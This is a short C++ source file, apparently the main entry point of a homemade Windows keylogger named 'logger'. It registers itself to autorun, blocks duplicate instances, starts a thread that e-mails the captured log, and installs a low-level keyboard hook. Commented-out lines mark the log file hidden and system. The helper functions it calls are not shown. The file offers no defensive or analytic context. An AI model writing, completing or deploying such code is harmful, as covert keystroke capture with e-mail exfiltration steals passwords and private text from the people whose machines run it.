
#include "header.h"

HHOOK keyboardHook;

int WINAPI WinMain(HINSTANCE hInstance,
HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
   	//stopThread = true;
	//System::Threading::Thread::Sleep(60000);
	//GetCurPath(logName);
	//static char namefile[] = "E:\\learning\\courses\\logger2\\Debug\\inf.txt";
	//SetFileAttributes(LPCWSTR(namefile), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	//std::ofstream log(namefile, std::ios::app); //opens log file
	//log << logName;
	//log << "test sasha\n"; //writes to log.. with format '['']'
	if(!SelfAutorun()) return 1;
	//log << "Past self autorun\n";
	if (Process::GetProcessesByName("logger")->Length > 1) return 0; //check for runed the same app
	//log << "Past check twice run\n";
	HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, &sendFileFun, NULL, 0, NULL); //run sending e-mail thread
	//log << "Past run sending file\n";
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, hInstance, 0); //hooks keyboard
	//log << "Past hooking\n";
	//log.close();
	msgLoop(); //stops from closing      
	stopThread = false;//for stoping sending e-mail
	UnhookWindowsHookEx(keyboardHook); //unhooks
	return 0; //Never run
	
}
